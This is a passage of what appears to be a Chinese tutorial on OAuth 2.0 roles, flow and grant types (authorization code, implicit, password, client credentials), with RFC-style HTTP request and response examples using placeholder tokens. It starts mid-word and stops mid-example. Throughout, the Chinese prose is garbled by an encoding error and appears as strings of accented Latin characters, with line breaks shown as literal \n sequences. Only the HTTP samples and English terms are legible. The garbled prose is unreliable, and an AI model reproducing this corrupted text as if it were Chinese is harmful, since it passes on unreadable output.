‡å‡†ï¼Œå…è®¸ç”¨æˆ·è®©ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®è¯¥ç”¨æˆ·åœ¨æŸä¸€ç½‘ç«™ä¸Šå­˜å‚¨çš„ç§å¯†çš„èµ„æºï¼ˆå¦‚ç…§ç‰‡ï¼Œè§†é¢‘ï¼Œè”ç³»äººåˆ—è¡¨ï¼‰ï¼Œè€Œ**æ— éœ€å°†ç”¨æˆ·åå’Œå¯†ç æä¾›ç»™ç¬¬ä¸‰æ–¹åº”ç”¨**ã€‚\n\nOAuthå…è®¸ç”¨æˆ·æä¾›ä¸€ä¸ªä»¤ç‰Œç»™ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œ**ä¸€ä¸ªä»¤ç‰Œå¯¹åº”ä¸€ä¸ªç‰¹å®šçš„ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ŒåŒæ—¶è¯¥ä»¤ç‰Œåªèƒ½åœ¨ç‰¹å®šçš„æ—¶é—´å†…è®¿é—®ç‰¹å®šçš„èµ„æºã€‚**\n\n\n\n### 1.1 æ€è·¯\n\nOAuthåœ¨\"å®¢æˆ·ç«¯\"ä¸\"æœåŠ¡æä¾›å•†\"ä¹‹é—´ï¼Œè®¾ç½®äº†ä¸€ä¸ªæˆæƒå±‚ï¼ˆauthorization layerï¼‰ã€‚\"å®¢æˆ·ç«¯\"ä¸èƒ½ç›´æ¥ç™»å½•\"æœåŠ¡æä¾›å•†\"ï¼Œåªèƒ½ç™»å½•æˆæƒå±‚ï¼Œä»¥æ­¤å°†ç”¨æˆ·ä¸å®¢æˆ·ç«¯åŒºåˆ†å¼€æ¥ã€‚\"å®¢æˆ·ç«¯\"ç™»å½•æˆæƒå±‚æ‰€ç”¨çš„ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œä¸ç”¨æˆ·çš„å¯†ç ä¸åŒã€‚ç”¨æˆ·å¯ä»¥åœ¨ç™»å½•çš„æ—¶å€™ï¼ŒæŒ‡å®šæˆæƒå±‚ä»¤ç‰Œçš„æƒé™èŒƒå›´å’Œæœ‰æ•ˆæœŸã€‚\n\n\"å®¢æˆ·ç«¯\"ç™»å½•æˆæƒå±‚ä»¥åï¼Œ\"æœåŠ¡æä¾›å•†\"æ ¹æ®ä»¤ç‰Œçš„æƒé™èŒƒå›´å’Œæœ‰æ•ˆæœŸï¼Œå‘\"å®¢æˆ·ç«¯\"å¼€æ”¾ç”¨æˆ·å‚¨å­˜çš„èµ„æ–™ã€‚\n\n\n\n### 1.2 è§’è‰²\n\n+ clientï¼šï¼ˆäº‘å†²å°ï¼‰:\tå®¢æˆ·ç«¯ä»£è¡¨å‘å—ä¿æŠ¤èµ„æºè¿›è¡Œèµ„æºè¯·æ±‚çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åº\n+ resource ownerï¼ˆç”¨æˆ·ï¼‰ï¼šèµ„æºæ‰€æœ‰è€…ï¼ŒæŒ‡ç»ˆç«¯çš„â€œç”¨æˆ·â€ï¼ˆuserï¼‰\n+ authorization serverï¼ˆè°·æ­Œæˆæƒï¼‰ï¼š æˆæƒæœåŠ¡å™¨ï¼Œ åœ¨éªŒè¯èµ„æºæ‰€æœ‰è€…å¹¶è·å¾—æˆæƒæˆåŠŸåï¼Œå°†å‘æ”¾è®¿é—®ä»¤ç‰Œç»™å®¢æˆ·ç«¯\n+ resource serverï¼šï¼ˆè°·æ­Œç…§ç‰‡å­˜æ”¾ï¼‰èµ„æºæœåŠ¡å™¨ï¼Œå³æœåŠ¡æä¾›å•†å­˜æ”¾å—ä¿æŠ¤èµ„æºã€‚è®¿é—®è¿™äº›èµ„æºï¼Œéœ€è¦è·å¾—è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰\n\n\n\n### 1.3 æµç¨‹\n\n<img src=\"https://www.ruanyifeng.com/blogimg/asset/2014/bg2014051203.png\" alt=\"OAuthè¿è¡Œæµç¨‹\" style=\"zoom: 67%;\" />\n\nï¼ˆAï¼‰ç”¨æˆ·æ‰“å¼€å®¢æˆ·ç«¯ä»¥åï¼Œå®¢æˆ·ç«¯è¦æ±‚ç”¨æˆ·ç»™äºˆæˆæƒã€‚\n\nï¼ˆBï¼‰ç”¨æˆ·åŒæ„ç»™äºˆå®¢æˆ·ç«¯æˆæƒã€‚\n\nï¼ˆCï¼‰å®¢æˆ·ç«¯ä½¿ç”¨ä¸Šä¸€æ­¥è·å¾—çš„æˆæƒï¼Œå‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œã€‚\n\nï¼ˆDï¼‰è®¤è¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ä»¥åï¼Œç¡®è®¤æ— è¯¯ï¼ŒåŒæ„å‘æ”¾ä»¤ç‰Œã€‚\n\nï¼ˆEï¼‰å®¢æˆ·ç«¯ä½¿ç”¨ä»¤ç‰Œï¼Œå‘èµ„æºæœåŠ¡å™¨ç”³è¯·è·å–èµ„æºã€‚\n\nï¼ˆFï¼‰èµ„æºæœåŠ¡å™¨ç¡®è®¤ä»¤ç‰Œæ— è¯¯ï¼ŒåŒæ„å‘å®¢æˆ·ç«¯å¼€æ”¾èµ„æºã€‚\n\n\n\nä¸éš¾çœ‹å‡ºæ¥ï¼Œä¸Šé¢å…­ä¸ªæ­¥éª¤ä¹‹ä¸­ï¼ŒBæ˜¯å…³é”®ï¼Œå³ç”¨æˆ·æ€æ ·æ‰èƒ½ç»™äºå®¢æˆ·ç«¯æˆæƒã€‚æœ‰äº†è¿™ä¸ªæˆæƒä»¥åï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥è·å–ä»¤ç‰Œï¼Œè¿›è€Œå‡­ä»¤ç‰Œè·å–èµ„æºã€‚\n\n\n\n# 2. æˆæƒæ¨¡å¼\n\nå®¢æˆ·ç«¯å¿…é¡»å¾—åˆ°ç”¨æˆ·çš„æˆæƒï¼ˆauthorization grantï¼‰ï¼Œæ‰èƒ½è·å¾—ä»¤ç‰Œï¼ˆaccess tokenï¼‰ã€‚OAuth 2.0å®šä¹‰äº†å››ç§æˆæƒæ–¹å¼ã€‚\n\n### 2.1 æˆæƒç æ¨¡å¼ï¼ˆauthorization codeï¼‰\n\næˆæƒç æ¨¡å¼ï¼ˆauthorization codeï¼‰æ˜¯åŠŸèƒ½æœ€å®Œæ•´ã€æµç¨‹æœ€ä¸¥å¯†çš„æˆæƒæ¨¡å¼ã€‚å®ƒçš„ç‰¹ç‚¹å°±æ˜¯é€šè¿‡å®¢æˆ·ç«¯çš„åå°æœåŠ¡å™¨ï¼Œä¸\"æœåŠ¡æä¾›å•†\"çš„è®¤è¯æœåŠ¡å™¨è¿›è¡Œäº’åŠ¨ã€‚\n\n<img src=\"OAuth2è®¤è¯æµç¨‹å’Œæˆæƒæ¨¡å¼/bg2014051204.png\" alt=\"æˆæƒç æ¨¡å¼\" style=\"zoom:67%;\" />\n\n\n\nï¼ˆAï¼‰ç”¨æˆ·è®¿é—®å®¢æˆ·ç«¯ï¼Œåè€…å°†å‰è€…å¯¼å‘è®¤è¯æœåŠ¡å™¨ã€‚\n\nï¼ˆBï¼‰ç”¨æˆ·é€‰æ‹©æ˜¯å¦ç»™äºˆå®¢æˆ·ç«¯æˆæƒã€‚\n\nï¼ˆCï¼‰å‡è®¾ç”¨æˆ·ç»™äºˆæˆæƒï¼Œè®¤è¯æœåŠ¡å™¨å°†ç”¨æˆ·å¯¼å‘å®¢æˆ·ç«¯äº‹å…ˆæŒ‡å®šçš„\"é‡å®šå‘URI\"ï¼ˆredirection URIï¼‰ï¼ŒåŒæ—¶é™„ä¸Šä¸€ä¸ªæˆæƒç ã€‚\n\nï¼ˆDï¼‰å®¢æˆ·ç«¯æ”¶åˆ°æˆæƒç ï¼Œé™„ä¸Šæ—©å…ˆçš„\"é‡å®šå‘URI\"ï¼Œå‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œã€‚è¿™ä¸€æ­¥æ˜¯åœ¨å®¢æˆ·ç«¯çš„åå°çš„æœåŠ¡å™¨ä¸Šå®Œæˆçš„ï¼Œå¯¹ç”¨æˆ·ä¸å¯è§ã€‚\n\nï¼ˆEï¼‰è®¤è¯æœåŠ¡å™¨æ ¸å¯¹äº†æˆæƒç å’Œé‡å®šå‘URIï¼Œç¡®è®¤æ— è¯¯åï¼Œå‘å®¢æˆ·ç«¯å‘é€è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰å’Œæ›´æ–°ä»¤ç‰Œï¼ˆrefresh tokenï¼‰ã€‚\n\n\n\nä¸‹é¢æ˜¯ä¸Šé¢è¿™äº›æ­¥éª¤æ‰€éœ€è¦çš„å‚æ•°ã€‚\n\nAæ­¥éª¤ä¸­ï¼Œå®¢æˆ·ç«¯ç”³è¯·è®¤è¯çš„URIï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- response_typeï¼šè¡¨ç¤ºæˆæƒç±»å‹ï¼Œå¿…é€‰é¡¹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"code\"\n- client_idï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„IDï¼Œå¿…é€‰é¡¹\n- redirect_uriï¼šè¡¨ç¤ºé‡å®šå‘URIï¼Œå¯é€‰é¡¹\n- scopeï¼šè¡¨ç¤ºç”³è¯·çš„æƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹\n- stateï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„å½“å‰çŠ¶æ€ï¼Œå¯ä»¥æŒ‡å®šä»»æ„å€¼ï¼Œè®¤è¯æœåŠ¡å™¨ä¼šåŸå°ä¸åŠ¨åœ°è¿”å›è¿™ä¸ªå€¼ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nGET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz&redirect_uri=https://client.example.com/cb HTTP/1.1\nHost: server.example.com\n```\n\nCæ­¥éª¤ä¸­ï¼ŒæœåŠ¡å™¨å›åº”å®¢æˆ·ç«¯çš„URIï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- codeï¼šè¡¨ç¤ºæˆæƒç ï¼Œå¿…é€‰é¡¹ã€‚è¯¥ç çš„æœ‰æ•ˆæœŸåº”è¯¥å¾ˆçŸ­ï¼Œé€šå¸¸è®¾ä¸º10åˆ†é’Ÿï¼Œå®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨è¯¥ç ä¸€æ¬¡ï¼Œå¦åˆ™ä¼šè¢«æˆæƒæœåŠ¡å™¨æ‹’ç»ã€‚è¯¥ç ä¸å®¢æˆ·ç«¯IDå’Œé‡å®šå‘URIï¼Œæ˜¯ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚\n- stateï¼šå¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚ä¸­åŒ…å«è¿™ä¸ªå‚æ•°ï¼Œè®¤è¯æœåŠ¡å™¨çš„å›åº”ä¹Ÿå¿…é¡»ä¸€æ¨¡ä¸€æ ·åŒ…å«è¿™ä¸ªå‚æ•°ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nHTTP/1.1 302 Found\nLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz\n```\n\nDæ­¥éª¤ä¸­ï¼Œå®¢æˆ·ç«¯å‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œçš„HTTPè¯·æ±‚ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- grant_typeï¼šè¡¨ç¤ºä½¿ç”¨çš„æˆæƒæ¨¡å¼ï¼Œå¿…é€‰é¡¹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"authorization_code\"ã€‚\n- codeï¼šè¡¨ç¤ºä¸Šä¸€æ­¥è·å¾—çš„æˆæƒç ï¼Œå¿…é€‰é¡¹ã€‚\n- redirect_uriï¼šè¡¨ç¤ºé‡å®šå‘URIï¼Œå¿…é€‰é¡¹ï¼Œä¸”å¿…é¡»ä¸Aæ­¥éª¤ä¸­çš„è¯¥å‚æ•°å€¼ä¿æŒä¸€è‡´ã€‚\n- client_idï¼šè¡¨ç¤ºå®¢æˆ·ç«¯IDï¼Œå¿…é€‰é¡¹ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https://client.example.com/cb\n```\n\nEæ­¥éª¤ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨å‘é€çš„HTTPå›å¤ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- access_tokenï¼šè¡¨ç¤ºè®¿é—®ä»¤ç‰Œï¼Œå¿…é€‰é¡¹ã€‚\n- token_typeï¼šè¡¨ç¤ºä»¤ç‰Œç±»å‹ï¼Œè¯¥å€¼å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¿…é€‰é¡¹ï¼Œå¯ä»¥æ˜¯bearerç±»å‹æˆ–macç±»å‹ã€‚\n- expires_inï¼šè¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œå¿…é¡»å…¶ä»–æ–¹å¼è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚\n- refresh_tokenï¼šè¡¨ç¤ºæ›´æ–°ä»¤ç‰Œï¼Œç”¨æ¥è·å–ä¸‹ä¸€æ¬¡çš„è®¿é—®ä»¤ç‰Œï¼Œå¯é€‰é¡¹ã€‚\n- scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¦‚æœä¸å®¢æˆ·ç«¯ç”³è¯·çš„èŒƒå›´ä¸€è‡´ï¼Œæ­¤é¡¹å¯çœç•¥ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n \"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n \"token_type\":\"example\",\n \"expires_in\":3600,\n \"refresh_token\":\"tGzv3JOkF0XG5Qx2TlKWIA\",\n  \"example_parameter\":\"example_value\"\n}\n```\n\nä»ä¸Šé¢ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œç›¸å…³å‚æ•°ä½¿ç”¨JSONæ ¼å¼å‘é€ï¼ˆContent-Type: application/jsonï¼‰ã€‚æ­¤å¤–ï¼ŒHTTPå¤´ä¿¡æ¯ä¸­æ˜ç¡®æŒ‡å®šä¸å¾—ç¼“å­˜ã€‚\n\n\n\n### 2.2 éšè—æ¨¡å¼ï¼ˆimplicitï¼‰\n\nè¿™ç§æ–¹å¼æŠŠä»¤ç‰Œç›´æ¥ä¼ ç»™å‰ç«¯ï¼Œæ˜¯å¾ˆä¸å®‰å…¨çš„ã€‚å› æ­¤ï¼Œåªèƒ½ç”¨äºä¸€äº›å®‰å…¨è¦æ±‚ä¸é«˜çš„åœºæ™¯ï¼Œå¹¶ä¸”ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå¿…é¡»éå¸¸çŸ­ï¼Œé€šå¸¸å°±æ˜¯ä¼šè¯æœŸé—´ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨å…³æ‰ï¼Œä»¤ç‰Œå°±å¤±æ•ˆäº†ã€‚\n\nç®€åŒ–æ¨¡å¼ï¼ˆimplicit grant typeï¼‰ä¸é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸­å‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œï¼Œè·³è¿‡äº†\"æˆæƒç \"è¿™ä¸ªæ­¥éª¤ï¼Œå› æ­¤å¾—åã€‚æ‰€æœ‰æ­¥éª¤åœ¨æµè§ˆå™¨ä¸­å®Œæˆï¼Œä»¤ç‰Œå¯¹è®¿é—®è€…æ˜¯å¯è§çš„ï¼Œä¸”å®¢æˆ·ç«¯ä¸éœ€è¦è®¤è¯ã€‚\n\n<img src=\"OAuth2è®¤è¯æµç¨‹å’Œæˆæƒæ¨¡å¼/bg2014051205.png\" alt=\"ç®€åŒ–æ¨¡å¼\" style=\"zoom:67%;\" />\n\n\n\nï¼ˆAï¼‰å®¢æˆ·ç«¯å°†ç”¨æˆ·å¯¼å‘è®¤è¯æœåŠ¡å™¨ã€‚\n\nï¼ˆBï¼‰ç”¨æˆ·å†³å®šæ˜¯å¦ç»™äºå®¢æˆ·ç«¯æˆæƒã€‚\n\nï¼ˆCï¼‰å‡è®¾ç”¨æˆ·ç»™äºˆæˆæƒï¼Œè®¤è¯æœåŠ¡å™¨å°†ç”¨æˆ·å¯¼å‘å®¢æˆ·ç«¯æŒ‡å®šçš„\"é‡å®šå‘URI\"ï¼Œå¹¶åœ¨URIçš„Hashéƒ¨åˆ†åŒ…å«äº†è®¿é—®ä»¤ç‰Œã€‚\n\nï¼ˆDï¼‰æµè§ˆå™¨å‘èµ„æºæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå…¶ä¸­ä¸åŒ…æ‹¬ä¸Šä¸€æ­¥æ”¶åˆ°çš„Hashå€¼ã€‚\n\nï¼ˆEï¼‰èµ„æºæœåŠ¡å™¨è¿”å›ä¸€ä¸ªç½‘é¡µï¼Œå…¶ä¸­åŒ…å«çš„ä»£ç å¯ä»¥è·å–Hashå€¼ä¸­çš„ä»¤ç‰Œã€‚\n\nï¼ˆFï¼‰æµè§ˆå™¨æ‰§è¡Œä¸Šä¸€æ­¥è·å¾—çš„è„šæœ¬ï¼Œæå–å‡ºä»¤ç‰Œã€‚\n\nï¼ˆGï¼‰æµè§ˆå™¨å°†ä»¤ç‰Œå‘ç»™å®¢æˆ·ç«¯ã€‚\n\nä¸‹é¢æ˜¯ä¸Šé¢è¿™äº›æ­¥éª¤æ‰€éœ€è¦çš„å‚æ•°ã€‚\n\nAæ­¥éª¤ä¸­ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„HTTPè¯·æ±‚ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- response_typeï¼šè¡¨ç¤ºæˆæƒç±»å‹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"token\"ï¼Œå¿…é€‰é¡¹ã€‚\n- client_idï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„IDï¼Œå¿…é€‰é¡¹ã€‚\n- redirect_uriï¼šè¡¨ç¤ºé‡å®šå‘çš„URIï¼Œå¯é€‰é¡¹ã€‚\n- scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹ã€‚\n- stateï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„å½“å‰çŠ¶æ€ï¼Œå¯ä»¥æŒ‡å®šä»»æ„å€¼ï¼Œè®¤è¯æœåŠ¡å™¨ä¼šåŸå°ä¸åŠ¨åœ°è¿”å›è¿™ä¸ªå€¼ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nGET /authorize?response_type=token&client_id=s6BhdRkqt3&state=xyz\n&redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\nHost: server.example.com\n```\n\nCæ­¥éª¤ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨å›åº”å®¢æˆ·ç«¯çš„URIï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- access_tokenï¼šè¡¨ç¤ºè®¿é—®ä»¤ç‰Œï¼Œå¿…é€‰é¡¹ã€‚\n- token_typeï¼šè¡¨ç¤ºä»¤ç‰Œç±»å‹ï¼Œè¯¥å€¼å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¿…é€‰é¡¹ã€‚\n- expires_inï¼šè¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œå¿…é¡»å…¶ä»–æ–¹å¼è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚\n- scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¦‚æœä¸å®¢æˆ·ç«¯ç”³è¯·çš„èŒƒå›´ä¸€è‡´ï¼Œæ­¤é¡¹å¯çœç•¥ã€‚\n- stateï¼šå¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚ä¸­åŒ…å«è¿™ä¸ªå‚æ•°ï¼Œè®¤è¯æœåŠ¡å™¨çš„å›åº”ä¹Ÿå¿…é¡»ä¸€æ¨¡ä¸€æ ·åŒ…å«è¿™ä¸ªå‚æ•°ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nHTTP/1.1 302 Found\nLocation: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA\n&state=xyz&token_type=example&expires_in=3600\n```\n\nåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨ç”¨HTTPå¤´ä¿¡æ¯çš„Locationæ ï¼ŒæŒ‡å®šæµè§ˆå™¨é‡å®šå‘çš„ç½‘å€ã€‚æ³¨æ„ï¼Œåœ¨è¿™ä¸ªç½‘å€çš„Hashéƒ¨åˆ†åŒ…å«äº†ä»¤ç‰Œã€‚\n\næ ¹æ®ä¸Šé¢çš„Dæ­¥éª¤ï¼Œä¸‹ä¸€æ­¥æµè§ˆå™¨ä¼šè®¿é—®LocationæŒ‡å®šçš„ç½‘å€ï¼Œä½†æ˜¯Hashéƒ¨åˆ†ä¸ä¼šå‘é€ã€‚æ¥ä¸‹æ¥çš„Eæ­¥éª¤ï¼ŒæœåŠ¡æä¾›å•†çš„èµ„æºæœåŠ¡å™¨å‘é€è¿‡æ¥çš„ä»£ç ï¼Œä¼šæå–å‡ºHashä¸­çš„ä»¤ç‰Œã€‚\n\n\n\n### 2.3 å¯†ç æ¨¡å¼ï¼ˆresource owner password credentialsï¼‰\n\nå¯†ç æ¨¡å¼ï¼ˆResource Owner Password Credentials Grantï¼‰ä¸­ï¼Œç”¨æˆ·å‘å®¢æˆ·ç«¯æä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ã€‚å®¢æˆ·ç«¯ä½¿ç”¨è¿™äº›ä¿¡æ¯ï¼Œå‘\"æœåŠ¡å•†æä¾›å•†\"ç´¢è¦æˆæƒã€‚\n\nåœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œç”¨æˆ·å¿…é¡»æŠŠè‡ªå·±çš„å¯†ç ç»™å®¢æˆ·ç«¯ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¸å¾—å‚¨å­˜å¯†ç ã€‚è¿™é€šå¸¸ç”¨åœ¨ç”¨æˆ·å¯¹å®¢æˆ·ç«¯é«˜åº¦ä¿¡ä»»çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯æ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…ç”±ä¸€ä¸ªè‘—åå…¬å¸å‡ºå“ã€‚è€Œè®¤è¯æœåŠ¡å™¨åªæœ‰åœ¨å…¶ä»–æˆæƒæ¨¡å¼æ— æ³•æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½è€ƒè™‘ä½¿ç”¨è¿™ç§æ¨¡å¼ã€‚\n\n<img src=\"OAuth2è®¤è¯æµç¨‹å’Œæˆæƒæ¨¡å¼/bg2014051206.png\" alt=\"å¯†ç æ¨¡å¼\" style=\"zoom:67%;\" />\n\nå®ƒçš„æ­¥éª¤å¦‚ä¸‹ï¼š\n\nï¼ˆAï¼‰ç”¨æˆ·å‘å®¢æˆ·ç«¯æä¾›ç”¨æˆ·åå’Œå¯†ç ã€‚\n>\nï¼ˆBï¼‰å®¢æˆ·ç«¯å°†ç”¨æˆ·åå’Œå¯†ç å‘ç»™è®¤è¯æœåŠ¡å™¨ï¼Œå‘åè€…è¯·æ±‚ä»¤ç‰Œã€‚\n>\nï¼ˆCï¼‰è®¤è¯æœåŠ¡å™¨ç¡®è®¤æ— è¯¯åï¼Œå‘å®¢æˆ·ç«¯æä¾›è®¿é—®ä»¤ç‰Œã€‚\n\nBæ­¥éª¤ä¸­ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„HTTPè¯·æ±‚ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- grant_typeï¼šè¡¨ç¤ºæˆæƒç±»å‹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"password\"ï¼Œå¿…é€‰é¡¹ã€‚\n- usernameï¼šè¡¨ç¤ºç”¨æˆ·åï¼Œå¿…é€‰é¡¹ã€‚\n- passwordï¼šè¡¨ç¤ºç”¨æˆ·çš„å¯†ç ï¼Œå¿…é€‰é¡¹ã€‚\n- scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=password&username=johndoe&password=A3ddj3w\n```\n\nCæ­¥éª¤ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€è®¿é—®ä»¤ç‰Œï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json;charset=UTF-8\nCache-Control: no-store\nPragma: no-cache\n\n{\n\"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\n\"token_type\":\"example\",\n\"expires_in\":3600,\n\"refresh_token\":\"tGzv3JOkF0XG5Qx2TlKWIA\",\n\"example_parameter\":\"example_value\"\n}\n```\n\næ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯ä¸å¾—ä¿å­˜ç”¨æˆ·çš„å¯†ç ã€‚\n\n\n\n### 2.4 å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆclient credentialsï¼‰\n\nå®¢æˆ·ç«¯æ¨¡å¼ï¼ˆClient Credentials Grantï¼‰æŒ‡å®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰ï¼Œè€Œä¸æ˜¯ä»¥ç”¨æˆ·çš„åä¹‰ï¼Œå‘\"æœåŠ¡æä¾›å•†\"è¿›è¡Œè®¤è¯ã€‚ä¸¥æ ¼åœ°è¯´ï¼Œå®¢æˆ·ç«¯æ¨¡å¼å¹¶ä¸å±äºOAuthæ¡†æ¶æ‰€è¦è§£å†³çš„é—®é¢˜ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œç”¨æˆ·ç›´æ¥å‘å®¢æˆ·ç«¯æ³¨å†Œï¼Œå®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰è¦æ±‚\"æœåŠ¡æä¾›å•†\"æä¾›æœåŠ¡ï¼Œå…¶å®ä¸å­˜åœ¨æˆæƒé—®é¢˜ã€‚\n\n<img src=\"OAuth2è®¤è¯æµç¨‹å’Œæˆæƒæ¨¡å¼/bg2014051207.png\" alt=\"å®¢æˆ·ç«¯æ¨¡å¼\" style=\"zoom:67%;\" />\n\n\n\nå®ƒçš„æ­¥éª¤å¦‚ä¸‹ï¼š\n\nï¼ˆAï¼‰å®¢æˆ·ç«¯å‘è®¤è¯æœåŠ¡å™¨è¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¹¶è¦æ±‚ä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚\n>\nï¼ˆBï¼‰è®¤è¯æœåŠ¡å™¨ç¡®è®¤æ— è¯¯åï¼Œå‘å®¢æˆ·ç«¯æä¾›è®¿é—®ä»¤ç‰Œã€‚\n\nAæ­¥éª¤ä¸­ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„HTTPè¯·æ±‚ï¼ŒåŒ…å«ä»¥ä¸‹å‚æ•°ï¼š\n\n- grant*typeï¼šè¡¨ç¤ºæˆæƒç±»å‹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸º\"client*credentials\"ï¼Œå¿…é€‰é¡¹ã€‚\n- scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹ã€‚\n\n```http\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=client_credentials\n```\n\nè®¤è¯æœåŠ¡å™¨å¿…é¡»ä»¥æŸç§æ–¹å¼ï¼ŒéªŒè¯å®¢æˆ·ç«¯èº«ä»½ã€‚\n\nBæ­¥éª¤ä¸­ï¼Œè®¤è¯æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€è®¿é—®ä»¤ç‰Œï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\n\n```http\nHTTP/1.1 200 OK\nContent-Type: 